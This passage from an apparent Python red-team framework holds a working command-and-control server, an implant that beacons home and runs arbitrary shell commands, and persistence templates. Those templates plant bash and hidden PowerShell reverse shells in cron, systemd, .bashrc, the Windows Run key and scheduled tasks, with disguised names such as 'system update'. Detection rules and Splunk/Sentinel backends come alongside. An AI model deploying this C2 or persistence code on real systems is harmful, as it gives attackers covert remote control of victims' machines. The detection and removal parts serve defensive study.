                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1"}


# ═══════════════════════════════════════════════════════════════
# SECTION 12 — OOB DNS
# ═══════════════════════════════════════════════════════════════
class OOBDNSServer:
    def __init__(self, port=DNS_PORT, token=None, bind_addr=OOB_BIND):
        self.port = port; self.token = token or secrets.token_hex(8)
        self.hits = []; self.lock = threading.Lock()
        self.sock = None; self.thread = None; self.stop_flag = False
        self.bind_addr = bind_addr
    def _handle(self, data, addr):
        with _wrap_silent("oob.handle"):
            import dns.message, dns.rdatatype
            msg = dns.message.from_wire(data)
            qname = str(msg.question[0].name) if msg.question else ""
            qtype = dns.rdatatype.to_text(msg.question[0].rdtype) if msg.question else "?"
            with self.lock:
                self.hits.append({"time": datetime.now(timezone.utc).isoformat(),
                                  "src": addr[0], "qname": qname, "qtype": qtype})
            resp = dns.message.make_response(msg)
            self.sock.sendto(resp.to_wire(), addr)
    def start(self):
        if not FEATURES.get("dnspython", {}).get("available"): return False
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.bind_addr, self.port)); self.sock.settimeout(1.0)
            def loop():
                while not self.stop_flag:
                    try: data, addr = self.sock.recvfrom(4096)
                    except socket.timeout: continue
                    except OSError: break
                    threading.Thread(target=self._handle, args=(data, addr), daemon=True).start()
            self.thread = threading.Thread(target=loop, daemon=True); self.thread.start()
            return True
        except Exception as e:
            SilentPassLogger.swallowed("oob.start", e)
            return False
    def stop(self):
        self.stop_flag = True
        with _wrap_silent("oob.stop"):
            if self.sock: self.sock.close()
    def get_hits(self, since=None):
        with self.lock: hits = list(self.hits)
        if since: hits = [h for h in hits if h["time"] > since]
        return hits


# ═══════════════════════════════════════════════════════════════
# SECTION 13 — C2
# ═══════════════════════════════════════════════════════════════
class NonceCache:
    def __init__(self, ttl=600):
        self.ttl = ttl; self.lock = threading.Lock(); self.cache = OrderedDict()
    def check_and_store(self, nonce):
        with self.lock:
            now = time.time()
            while self.cache and next(iter(self.cache.values())) < now - self.ttl:
                self.cache.popitem(last=False)
            if nonce in self.cache: return False
            self.cache[nonce] = now
            if len(self.cache) > 100000: self.cache.popitem(last=False)
            return True

class C2Auth:
    def __init__(self, psk, nonce_cache=None):
        self.psk = psk.encode() if isinstance(psk, str) else psk
        self.nonces = nonce_cache or NonceCache()
    def sign(self, payload, ts, nonce):
        msg = ts.encode() + b"." + nonce.encode() + b"." + payload
        return hmac.new(self.psk, msg, hashlib.sha256).hexdigest()
    def verify(self, payload, ts, nonce, sig, window=300):
        try: ts_int = int(ts)
        except Exception: return False
        if abs(time.time() - ts_int) > window: return False
        if not self.nonces.check_and_store(nonce): return False
        return hmac.compare_digest(self.sign(payload, ts, nonce), sig)

class C2Session:
    def __init__(self, sid, channel, host, os_info="", user=""):
        self.session_id = sid; self.channel = channel
        self.host = host; self.os_info = os_info; self.user = user
        self.first_seen = datetime.now(timezone.utc).isoformat()
        self.last_seen = self.first_seen
        self.tasks = []; self.responses = []; self.alive = True
        self.session_token = secrets.token_hex(16)
    def to_dict(self):
        return {"session_id": self.session_id, "channel": self.channel,
                "host": self.host, "os": self.os_info, "user": self.user,
                "first_seen": self.first_seen, "last_seen": self.last_seen,
                "tasks": len(self.tasks), "responses": len(self.responses),
                "alive": self.alive}

class C2Server:
    def __init__(self, host=C2_BIND, http_port=C2_HTTP_PORT, dns_port=C2_DNS_PORT,
                 psk=C2_PSK, logger=None):
        self.host = host; self.http_port = http_port; self.dns_port = dns_port
        self.psk = psk; self.auth = C2Auth(psk); self.logger = logger
        self.sessions = {}; self.lock = threading.RLock()
        self.http_srv = None; self.dns_srv = None; self.running = False
        self.cert_path = None; self.key_path = None
        self._gen_cert()
    def _gen_cert(self):
        if not FEATURES.get("cryptography", {}).get("available"): return
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.backends import default_backend
            C2_DIR.mkdir(parents=True, exist_ok=True)
            self.cert_path = str(C2_DIR / "c2_cert.pem")
            self.key_path = str(C2_DIR / "c2_key.pem")
            if os.path.exists(self.cert_path) and os.path.exists(self.key_path): return
            key = rsa.generate_private_key(public_exponent=65537, key_size=2048,
                                            backend=default_backend())
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "XX"),
                x509.NameAttribute(NameOID.COMMON_NAME, "c2.local")])
            cert = (x509.CertificateBuilder().subject_name(subject).issuer_name(issuer)
                    .public_key(key.public_key()).serial_number(x509.random_serial_number())
                    .not_valid_before(datetime.now(timezone.utc))
                    .not_valid_after(datetime.now(timezone.utc) + timedelta(days=365))
                    .sign(key, hashes.SHA256(), default_backend()))
            with open(self.cert_path, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            with open(self.key_path, "wb") as f:
                f.write(key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()))
            os.chmod(self.key_path, 0o600)
        except Exception as e:
            SilentPassLogger.swallowed("c2.gen_cert", e)
    def register_session(self, sid, channel, host, os_info="", user=""):
        with self.lock:
            if sid not in self.sessions:
                self.sessions[sid] = C2Session(sid, channel, host, os_info, user)
                if self.logger:
                    self.logger.log(f"C2 session: {sid} via {channel} @ {host}", "found")
            else:
                self.sessions[sid].last_seen = datetime.now(timezone.utc).isoformat()
            return self.sessions[sid]
    def heartbeat(self, sid):
        with self.lock:
            s = self.sessions.get(sid)
            if s:
                s.last_seen = datetime.now(timezone.utc).isoformat()
                s.alive = True; return True
        return False
    def queue_task(self, sid, task):
        with self.lock:
            s = self.sessions.get(sid)
            if not s: return False
            s.tasks.append(task); return True
    def pop_task(self, sid, session_token=None):
        with self.lock:
            s = self.sessions.get(sid)
            if not s or not s.tasks: return None
            if session_token and s.session_token != session_token: return None
            return s.tasks.pop(0)
    def record_response(self, sid, response, session_token=None):
        with self.lock:
            s = self.sessions.get(sid)
            if not s: return False
            if session_token and s.session_token != session_token: return False
            s.responses.append(response)
            s.last_seen = datetime.now(timezone.utc).isoformat(); return True
    def list_sessions(self):
        with self.lock: return [s.to_dict() for s in self.sessions.values()]
    def start(self):
        if self.running: return True
        try:
            self.http_srv = C2HTTPServer((self.host, self.http_port),
                                          C2HTTPHandler, self,
                                          self.cert_path, self.key_path)
            threading.Thread(target=self.http_srv.serve_forever, daemon=True).start()
        except Exception as e:
            if self.logger: self.logger.log(f"C2 HTTPS: {e}", "error")
            return False
        if FEATURES.get("dnspython", {}).get("available"):
            self.dns_srv = C2DNSServer(self.host, self.dns_port, self)
            self.dns_srv.start()
        self.running = True
        if self.logger:
            self.logger.log(f"C2 server: HTTPS {self.host}:{self.http_port} "
                            f"DNS {self.host}:{self.dns_port}", "found")
        return True
    def stop(self):
        self.running = False
        with _wrap_silent("c2.stop.http"):
            if self.http_srv: self.http_srv.shutdown()
        with _wrap_silent("c2.stop.dns"):
            if self.dns_srv: self.dns_srv.stop()

class C2HTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    def __init__(self, addr, handler, c2, certfile=None, keyfile=None):
        super().__init__(addr, handler)
        self.c2 = c2; self.certfile = certfile; self.keyfile = keyfile
        self._ssl_ctx = None
        if certfile and keyfile and FEATURES.get("cryptography", {}).get("available"):
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            self._ssl_ctx = ctx
    def get_request(self):
        sock, addr = super().get_request()
        if self._ssl_ctx:
            try: sock = self._ssl_ctx.wrap_socket(sock, server_side=True)
            except Exception as e:
                SilentPassLogger.swallowed("c2.wrap_socket", e)
        return sock, addr

class C2HTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, *a, **k): pass
    def _read_body(self):
        try:
            ln = int(self.headers.get("Content-Length") or 0)
            if ln <= 0 or ln > 1_000_000: return b""
            return self.rfile.read(ln)
        except Exception: return b""
    def _verify_sig(self, body):
        c2 = self.server.c2
        ts = self.headers.get("X-C2-Ts", "")
        sig = self.headers.get("X-C2-Sig", "")
        nonce = self.headers.get("X-C2-Nonce", "")
        if not (ts and sig and nonce): return False
        return c2.auth.verify(body, ts, nonce, sig)
    def _send(self, code, data=None):
        try:
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Server", "nginx")
            self.end_headers()
            if data is not None: self.wfile.write(json.dumps(data).encode())
        except Exception as e:
            SilentPassLogger.swallowed("c2._send", e)
    def do_POST(self):
        c2 = self.server.c2
        path = urlparse(self.path).path
        body = self._read_body()
        if not self._verify_sig(body):
            self._send(401, {"error": "unauthorized"}); return
        try: data = json.loads(body.decode("utf-8", "ignore")) if body else {}
        except Exception:
            self._send(400, {"error": "bad json"}); return
        if path == "/beacon":
            sid = data.get("session_id") or secrets.token_hex(8)
            s = c2.register_session(sid, "https", data.get("host", "?"),
                                     data.get("os", ""), data.get("user", ""))
            self._send(200, {"session_id": sid, "session_token": s.session_token,
                             "interval": 5, "jitter": 2})
        elif path == "/result":
            sid = data.get("session_id"); tok = data.get("session_token")
            if not sid:
                self._send(400, {"error": "no session"}); return
            ok = c2.record_response(sid, {
                "task_id": data.get("task_id"),
                "output": data.get("output", ""),
                "ts": datetime.now(timezone.utc).isoformat(),
            }, session_token=tok)
            self._send(200 if ok else 403, {"ok": ok})
        else:
            self._send(404)
    def do_GET(self):
        c2 = self.server.c2
        parsed = urlparse(self.path)
        if parsed.path == "/health":
            self._send(200, {"status": "ok", "sessions": len(c2.sessions)}); return
        if parsed.path == "/task":
            qs = parse_qs(parsed.query)
            sid = (qs.get("sid") or [None])[0]
            ts = (qs.get("ts") or [None])[0]
            nonce = (qs.get("nonce") or [None])[0]
            sig = (qs.get("sig") or [None])[0]
            stok = (qs.get("stok") or [None])[0]
            if not (sid and ts and nonce and sig):
                self._send(401, {"error": "missing auth"}); return
            if not c2.auth.verify(b"", ts, nonce, sig):
                self._send(401, {"error": "bad sig"}); return
            if not c2.heartbeat(sid):
                self._send(401, {"error": "unknown session"}); return
            t = c2.pop_task(sid, stok)
            if t is None: self._send(204); return
            self._send(200, t)
        elif parsed.path == "/sessions":
            self._send(200, {"sessions": c2.list_sessions()})
        else:
            self._send(404)

class C2DNSServer:
    def __init__(self, host, port, c2):
        self.host = host; self.port = port; self.c2 = c2
        self.sock = None; self.thread = None; self.stop_flag = False
    def _handle(self, data, addr):
        with _wrap_silent("c2.dns._handle"):
            import dns.message, dns.rdatatype, dns.rdataclass, dns.rrset
            msg = dns.message.from_wire(data)
            qname = str(msg.question[0].name).rstrip(".")
            parts = qname.split(".")
            resp = dns.message.make_response(msg)
            if len(parts) < 3:
                self.sock.sendto(resp.to_wire(), addr); return
            sid = parts[0]; kind = parts[1]
            self.c2.heartbeat(sid)
            if kind == "task":
                t = self.c2.pop_task(sid, None)
                tj = json.dumps(t)[:200] if t else ""
                rrset = dns.rrset.from_text(qname, 30, dns.rdataclass.IN,
                                             dns.rdatatype.TXT,
                                             '"' + tj.replace('"', '\\"') + '"')
                resp.answer.append(rrset)
            self.sock.sendto(resp.to_wire(), addr)
    def start(self):
        if not FEATURES.get("dnspython", {}).get("available"): return False
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port)); self.sock.settimeout(1.0)
            def loop():
                while not self.stop_flag:
                    try: data, addr = self.sock.recvfrom(4096)
                    except socket.timeout: continue
                    except OSError: break
                    threading.Thread(target=self._handle, args=(data, addr), daemon=True).start()
            self.thread = threading.Thread(target=loop, daemon=True); self.thread.start()
            return True
        except Exception as e:
            SilentPassLogger.swallowed("c2.dns.start", e)
            return False
    def stop(self):
        self.stop_flag = True
        with _wrap_silent("c2.dns.stop"):
            if self.sock: self.sock.close()


# ═══════════════════════════════════════════════════════════════
# SECTION 14 — C2 IMPLANT + PERSISTENCE
# ═══════════════════════════════════════════════════════════════
class C2Implant:
    def __init__(self, server_url, psk, session_id=None, interval=5, jitter=2,
                 verify=False, cmd_timeout=15):
        self.server_url = server_url.rstrip("/")
        self.auth = C2Auth(psk)
        self.session_id = session_id or secrets.token_hex(8)
        self.session_token = None
        self.interval = interval; self.jitter = jitter
        self.verify = verify; self.cmd_timeout = cmd_timeout
        self.running = False
    def _sign_headers(self, body):
        ts = str(int(time.time())); nonce = secrets.token_hex(8)
        sig = self.auth.sign(body, ts, nonce)
        return {"X-C2-Ts": ts, "X-C2-Sig": sig, "X-C2-Nonce": nonce,
                "Content-Type": "application/json"}
    def beacon(self):
        body = json.dumps({
            "session_id": self.session_id, "host": socket.gethostname(),
            "os": sys.platform,
            "user": os.environ.get("USER", os.environ.get("USERNAME", "")),
            "ts": int(time.time())}).encode()
        try:
            r = requests.post(self.server_url + "/beacon", data=body,
                              headers=self._sign_headers(body), verify=self.verify, timeout=10)
            if r.status_code == 200:
                self.session_token = r.json().get("session_token"); return True
        except Exception:
            pass
        return False
    def get_task(self):
        if not self.session_token: return None
        try:
            ts = str(int(time.time())); nonce = secrets.token_hex(8)
            sig = self.auth.sign(b"", ts, nonce)
            qs = urllib.parse.urlencode({"sid": self.session_id, "ts": ts,
                                          "nonce": nonce, "sig": sig,
                                          "stok": self.session_token})
            r = requests.get(f"{self.server_url}/task?{qs}",
                             verify=self.verify, timeout=10)
            if r.status_code == 200 and r.text: return r.json()
        except Exception:
            pass
        return None
    def send_result(self, task_id, output):
        if not self.session_token: return
        body = json.dumps({
            "session_id": self.session_id, "session_token": self.session_token,
            "task_id": task_id, "output": output[:8000],
            "ts": int(time.time())}).encode()
        try:
            requests.post(self.server_url + "/result", data=body,
                          headers=self._sign_headers(body), verify=self.verify, timeout=10)
        except Exception:
            pass
    def execute(self, task):
        try:
            if task.get("type") == "shell":
                out = subprocess.run(task.get("cmd", "id"), shell=True,
                                     capture_output=True, text=True,
                                     timeout=self.cmd_timeout)
                return (out.stdout or "") + (out.stderr or "")
            return f"unknown type: {task.get('type')}"
        except Exception as e: return f"error: {e!r}"
    def run_once(self):
        self.beacon()
        t = self.get_task()
        if t:
            out = self.execute(t)
            self.send_result(t.get("id", str(uuid.uuid4())), out)
            return True
        return False
    def run(self, max_iters=None):
        self.running = True; i = 0
        while self.running and (max_iters is None or i < max_iters):
            i += 1
            try: self.run_once()
            except KeyboardInterrupt: break
            except Exception:
                pass
            time.sleep(self.interval + random.uniform(0, self.jitter))
    def stop(self): self.running = False


class ImplantPersistence:
    @staticmethod
    def linux_cron(lhost, lport):
        return {"name": "cron_reboot",
                "install_cmd": f"(crontab -l 2>/dev/null; echo \"@reboot bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\") | crontab -",
                "detect_cmd": "crontab -l 2>/dev/null | grep -c 'dev/tcp'",
                "remove_cmd": "crontab -l 2>/dev/null | grep -v 'dev/tcp' | crontab -",
                "detection_sigma": {"title": "Suspicious cron dev/tcp", "level": "high"}}
    @staticmethod
    def linux_systemd(lhost, lport):
        unit = f"[Unit]\nDescription=system update\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\nRestart=always\n[Install]\nWantedBy=multi-user.target\n"
        return {"name": "systemd_persistence", "unit_content": unit,
                "install_cmd": f"cat > /etc/systemd/system/system-update.service << 'EOF'\n{unit}EOF\nsystemctl daemon-reload && systemctl enable system-update.service",
                "detect_cmd": "systemctl list-units --type=service | grep system-update",
                "remove_cmd": "systemctl stop system-update.service; systemctl disable system-update.service; rm -f /etc/systemd/system/system-update.service",
                "detection_sigma": {"title": "Suspicious systemd dev/tcp", "level": "high"}}
    @staticmethod
    def linux_bashrc(lhost, lport):
        return {"name": "bashrc_persistence",
                "install_cmd": f"grep -q 'dev/tcp' ~/.bashrc || echo \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &\" >> ~/.bashrc",
                "detect_cmd": "grep -c 'dev/tcp' ~/.bashrc 2>/dev/null",
                "remove_cmd": "sed -i '/dev\\/tcp/d' ~/.bashrc",
                "detection_sigma": {"title": "Bashrc dev/tcp", "level": "medium"}}
    @staticmethod
    def windows_registry_run(lhost, lport):
        ps = (f"$cmd = 'powershell -nop -w hidden -c \"$c=New-Object "
              f"Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();"
              f"[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;"
              f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
              f"$o=(iex $d 2>&1 | Out-String);"
              f"$sb=([text.encoding]::ASCII).GetBytes($o);"
              f"$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"'; "
              f"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
              f"-Name 'SystemUpdate' -Value $cmd -PropertyType String -Force")
        return {"name": "windows_registry_run",
                "install_cmd": f'powershell -nop -w hidden -c "{ps}"',
                "detect_cmd": "powershell -c \"Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' | Select-Object SystemUpdate\"",
                "remove_cmd": "powershell -c \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemUpdate' -Force\"",
                "detection_sigma": {"title": "Registry Run key with encoded PowerShell", "level": "critical"}}
    @staticmethod
    def windows_scheduled_task(lhost, lport):
        name = "SystemHealthCheck"
        cmd = (f"powershell -nop -w hidden -c \"$c=New-Object "
               f"Net.Sockets.TCPClient('{lhost}',{lport});"
               f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
               f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;"
               f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);iex $d}};\"")
        return {"name": "windows_scheduled_task",
                "install_cmd": f'schtasks /Create /TN {name} /TR "{cmd}" /SC ONLOGON /RL HIGHEST /F',
                "detect_cmd": f"schtasks /Query /TN {name} /FO LIST",
                "remove_cmd": f"schtasks /Delete /TN {name} /F",
                "detection_sigma": {"title": "Scheduled task with hidden PowerShell", "level": "critical"}}
    @staticmethod
    def all_linux(lhost, lport):
        return [ImplantPersistence.linux_cron(lhost, lport),
                ImplantPersistence.linux_systemd(lhost, lport),
                ImplantPersistence.linux_bashrc(lhost, lport)]
    @staticmethod
    def all_windows(lhost, lport):
        return [ImplantPersistence.windows_registry_run(lhost, lport),
                ImplantPersistence.windows_scheduled_task(lhost, lport)]


# ═══════════════════════════════════════════════════════════════
# SECTION 15 — SIGMA ENGINE (honest labels #12, #13)
# ═══════════════════════════════════════════════════════════════
class SigmaEngine:
    """Sigma rule generation + conversion.
    Engines: sigma-cli > pySigma > fallback_simplified.
    The 'engine' field of every result is HONEST — never says "sigma"
    when it's the simplified fallback."""

    @staticmethod
    def build_rule(fdict):
        vtype = (fdict.get("type") or "").lower()
        url = fdict.get("url", "")
        host = urlparse(url).netloc if url else "target"
        if "sqli" in vtype:
            det = ["'", "\"", "UNION", "SLEEP(", "WAITFOR"]
            title = f"SQLi attempt against {host}"
        elif "lfi" in vtype:
            det = ["../", "..%2f", "/etc/passwd"]
            title = f"LFI attempt against {host}"
        elif "cmdi" in vtype or "rce" in vtype:
            det = [";id", "|id", "$(id)"]
            title = f"RCE attempt against {host}"
        elif "xss" in vtype:
            det = ["<script", "onerror=", "javascript:"]
            title = f"XSS attempt against {host}"
        else:
            det = [vtype] if vtype else ["unknown"]
            title = f"Generic attempt against {host}"
        lines = [f"title: {title}", "status: experimental",
                 "logsource:", "  category: webserver",
                 "detection:", "  selection:",
                 "    cs-uri-query|contains:"]
        for v in det:
            lines.append(f"      - '{v}'")
        lines += ["  condition: selection", "level: high"]
        return "\n".join(lines) + "\n"

    @staticmethod
    def engine_available():
        """FIX #13: probe REAL availability with version + import shape check."""
        sigma_bin = shutil.which("sigma")
        if sigma_bin:
            try:
                r = subprocess.run([sigma_bin, "--version"], capture_output=True,
                                    text=True, timeout=5)
                if r.returncode == 0:
                    return "sigma-cli", r.stdout.strip()
            except Exception as e:
                SilentPassLogger.swallowed("sigma.probe.cli", e)
        if FEATURES.get("sigma", {}).get("available"):
            try:
                # Shape check: SigmaCollection + LuceneBackend must both import
                from sigma.collection import SigmaCollection  # noqa
                from sigma.backends.elasticsearch import LuceneBackend  # noqa
                try:
                    import sigma as _s
                    ver = getattr(_s, "__version__", "unknown")
                except Exception:
                    ver = "unknown"
                return "pysigma", ver
            except Exception as e:
                SilentPassLogger.swallowed("sigma.probe.pysigma", e)
        return None, None

    @staticmethod
    def convert(rule_yaml, backend="es-qs"):
        """Return dict with HONEST engine name."""
        sigma_bin = shutil.which("sigma")
        if sigma_bin:
            try:
                with tempfile.NamedTemporaryFile("w", suffix=".yml",
                                                  delete=False, encoding="utf-8") as f:
                    f.write(rule_yaml); tmp = f.name
                try:
                    r = subprocess.run([sigma_bin, "convert", "-t", backend, tmp],
                                        capture_output=True, text=True, timeout=20)
                    if r.returncode == 0:
                        return {"ok": True, "query": r.stdout.strip(),
                                "engine": "sigma-cli", "backend": backend,
                                "real_sigma": True}
                    return {"ok": False, "error": r.stderr[:300],
                            "engine": "sigma-cli", "backend": backend}
                finally:
                    with _wrap_silent("sigma.cleanup"):
                        os.unlink(tmp)
            except Exception as e:
                return {"ok": False, "error": repr(e),
                        "engine": "sigma-cli", "backend": backend}
        if FEATURES.get("sigma", {}).get("available"):
            try:
                from sigma.collection import SigmaCollection
                from sigma.backends.elasticsearch import LuceneBackend
                coll = SigmaCollection.from_yaml(rule_yaml)
                queries = LuceneBackend().convert(coll)
                return {"ok": True, "query": queries[0] if queries else "",
                        "engine": "pysigma", "backend": "es-lucene",
                        "real_sigma": True}
            except Exception as e:
                return {"ok": False, "error": repr(e),
                        "engine": "pysigma", "backend": "es-lucene"}
        return {"ok": False, "error": "no sigma engine installed",
                "engine": "none", "real_sigma": False}

    @staticmethod
    def match_event(rule_yaml, event):
        """Fallback matcher. Labels itself honestly via caller.

        Returns bool. Caller must check engine_available() to know
        whether this is real Sigma or our simplified matcher.
        """
        try:
            import yaml as _yaml
            rule = _yaml.safe_load(rule_yaml)
        except ImportError:
            rule = None
        except Exception:
            return False

        if rule is None:
            values = re.findall(r"-\s*'([^']+)'", rule_yaml)
            if not values: return False
            haystack = " ".join(str(event.get(k, "")) for k in
                                ("url", "cs-uri-query", "query", "uri", "path"))
            return any(v in haystack or v in unquote(haystack) for v in values)

        det = rule.get("detection", {})
        selection = det.get("selection", {})
        if not isinstance(selection, dict): return False

        for key, value in selection.items():
            if "|" in key:
                field, op = key.split("|", 1)
            else:
                field, op = key, "exact"
            candidates = []
            for k in (field, "url", "cs-uri-query", "query", "uri", "path"):
                if k in event: candidates.append(str(event[k]))
            decoded = [unquote(c) for c in candidates]
            haystack = " ".join(candidates + decoded)
            vals = value if isinstance(value, list) else [value]
            vals = [str(v) for v in vals]
            if op == "contains":
                ok = any(v in haystack for v in vals)
                if not ok:
                    hl = haystack.lower()
                    ok = any(v.lower() in hl for v in vals)
                if not ok: return False
            elif op == "endswith":
                if not any(haystack.endswith(v) for v in vals): return False
            elif op == "startswith":
                if not any(haystack.startswith(v) for v in vals): return False
            elif op == "re":
                if not any(re.search(v, haystack) for v in vals): return False
            else:
                hl = haystack.lower()
                if not any(v.lower() in hl for v in vals): return False
        return True

    @staticmethod
    def to_splunk(rule_yaml): return SigmaEngine.convert(rule_yaml, backend="splunk")
    @staticmethod
    def to_sentinel(rule_yaml): return SigmaEngine.convert(rule_yaml, backend="sentinel")
    @staticmethod
    def to_es_qs(rule_yaml): return SigmaEngine.convert(rule_yaml, backend="es-qs")


# ═══════════════════════════════════════════════════════════════
# SECTION 16 — SPLUNK / SENTINEL REAL BACKENDS (#2, #3)
# ═══════════════════════════════════════════════════════════════
class SplunkBackend:
    """FIX #2: real search roundtrip via /services/search/jobs."""
    def __init__(self):
        self.url = SPLUNK_URL.rstrip("/") if SPLUNK_URL else ""
        self.token = SPLUNK_TOKEN
        self.user = SPLUNK_USER
        self.password = SPLUNK_PASS

    def _auth(self):
        if self.token:
            return {"Authorization": f"Bearer {self.token}"}
        if self.user and self.password:
            return {"Authorization": "Basic " + base64.b64encode(
                f"{self.user}:{self.password}".encode()).decode()}
        return {}

    def available(self):
        if not self.url: return False
        try:
            r = requests.get(self.url + "/services/server/info",
                              headers=self._auth(), verify=False, timeout=5)
            return r.status_code < 500
        except Exception:
            return False

    def submit_search(self, spl: str, earliest="-1h", latest="now"):
        """POST to /services/search/jobs."""
        try:
            r = requests.post(
                self.url + "/services/search/jobs",
                headers={**self._auth(), "Content-Type": "application/x-www-form-urlencoded"},
                data={"search": spl if spl.startswith("search ") else f"search {spl}",
                       "earliest_time": earliest, "latest_time": latest,
                       "output_mode": "json"},
                verify=False, timeout=15)
            if r.status_code not in (200, 201):
                return {"ok": False, "status": r.status_code, "body": r.text[:500]}
            # response has <sid>...</sid> in XML if output_format=xml,
            # but we asked JSON. Try both.
            try:
                j = r.json()
                sid = j.get("sid") or (j.get("entry") or [{}])[0].get("name")
            except Exception:
                m = re.search(r"<sid>([^<]+)</sid>", r.text)
                sid = m.group(1) if m else None
            return {"ok": bool(sid), "sid": sid}
        except Exception as e:
            return {"ok": False, "error": repr(e)}

    def job_status(self, sid):
        try:
            r = requests.get(f"{self.url}/services/search/jobs/{sid}",
                              headers={**self._auth(),
                                       "Content-Type": "application/json"},
                              params={"output_mode": "json"},
                              verify=False, timeout=10)
            if r.status_code != 200:
                return {"ok": False, "status": r.status_code}
            j = r.json()
            entry = (j.get("entry") or [{}])[0]
            content = entry.get("content", {})
            return {"ok": True,
                    "dispatchState": content.get("dispatchState", "UNKNOWN"),
                    "isDone": content.get("isDone", False),
                    "resultCount": content.get("resultCount", 0)}
        except Exception as e:
            return {"ok": False, "error": repr(e)}

    def job_results(self, sid):
        try:
            r = requests.get(f"{self.url}/services/search/jobs/{sid}/results",
                              headers={**self._auth(), "Content-Type": "application/json"},
                              params={"output_mode": "json", "count": 100},
                              verify=False, timeout=15)
            if r.status_code != 200:
                return {"ok": False, "status": r.status_code, "body": r.text[:500]}
            j = r.json()
            return {"ok": True, "results": j.get("results", [])}
        except Exception as e:
            return {"ok": False, "error": repr(e)}

    def run_search(self, spl, timeout_s=30):
        """Submit, poll, fetch results."""
        sub = self.submit_search(spl)
        if not sub.get("ok"): return sub
        sid = sub["sid"]
        t0 = time.time()
        while time.time() - t0 < timeout_s:
            st = self.job_status(sid)
            if not st.get("ok"): return st
            if st.get("isDone"): break
            time.sleep(1)
        return self.job_results(sid)


class SentinelBackend:
    """FIX #3: real KQL query via Azure Log Analytics Query API."""
    def __init__(self):
        self.workspace = SENTINEL_WORKSPACE
        self.tenant = SENTINEL_TENANT
        self.client_id = SENTINEL_CLIENT_ID
        self.client_secret = SENTINEL_CLIENT_SECRET

    def available(self):
        return bool(self.workspace and self.tenant and self.client_id and self.client_secret)

    def _token(self):
        """OAuth2 client credentials flow."""
        try:
            r = requests.post(
                f"https://login.microsoftonline.com/{self.tenant}/oauth2/v2.0/token",
                data={"grant_type": "client_credentials",
                       "client_id": self.client_id,
                       "client_secret": self.client_secret,
                       "scope": "https://api.loganalytics.io/.default"},
                timeout=15)
            if r.status_code != 200:
                return {"ok": False, "status": r.status_code, "body": r.text[:300]}
            return {"ok": True, "token": r.json().get("access_token", "")}
        except Exception as e:
            return {"ok": False, "error": repr(e)}

    def run_query(self, kql, timespan="PT1H"):
        tok = self._token()
        if not tok.get("ok"): return tok
        try:
            r = requests.post(
                f"https://api.loganalytics.io/v1/workspaces/{self.workspace}/query",
                headers={"Authorization": f"Bearer {tok['token']}",
                          "Content-Type": "application/json"},
                json={"query": kql, "timespan": timespan},
                timeout=30)
            if r.status_code != 200:
                return {"ok": False, "status": r.status_code, "body": r.text[:500]}
            j = r.json()
            tables = j.get("tables", [])
            return {"ok": True, "tables": tables, "row_count": sum(len(t.get("rows", [])) for t in tables)}
        except Exception as e:
            return {"ok": False, "error": repr(e)}


# ═══════════════════════════════════════════════════════════════
# SECTION 17 — ML PRIORITIZER
# ═══════════════════════════════════════════════════════════════
class MLPrioritizer:
    def __init__(self, logger=None, model_path=None, state_db=None):
        self.logger = logger
        self.model_path = str(model_path or (ML_DIR / "ml_model.pkl"))
        self.model = self._load_model()
        self.state = state_db or StateDB(str(STATE_DIR / "ml_state.db"), scope_key="ml")
        self._train_lock = threading.Lock()
    def _load_model(self):
        if not FEATURES.get("sklearn", {}).get("available"): return None
        try:
            if os.path.exists(self.model_path):
                import pickle
                with open(self.model_path, "rb") as f: return pickle.load(f)
        except Exception as e:
            SilentPassLogger.swallowed("ml.load_model", e)
        return None
    def _save_model(self):
        if not self.model: return
        try:
            ML_DIR.mkdir(parents=True, exist_ok=True)
            import pickle
            with open(self.model_path, "wb") as f: pickle.dump(self.model, f)
        except Exception as e:
            SilentPassLogger.swallowed("ml.save_model", e)
    def _features(self, fdict):
        vtype = (fdict.get("type") or "").lower()
        url = (fdict.get("url") or "").lower()
        sev = (fdict.get("severity") or "info").lower()
        return [float(fdict.get("signal_score", 0.0)),
                float(fdict.get("independent_signals", 0)),
                1.0 if fdict.get("verified") else 0.0,
                1.0 if sev == "critical" else 0.0,
                1.0 if sev == "high" else 0.0,
                1.0 if sev == "medium" else 0.0,
                1.0 if "rce" in vtype else 0.0,
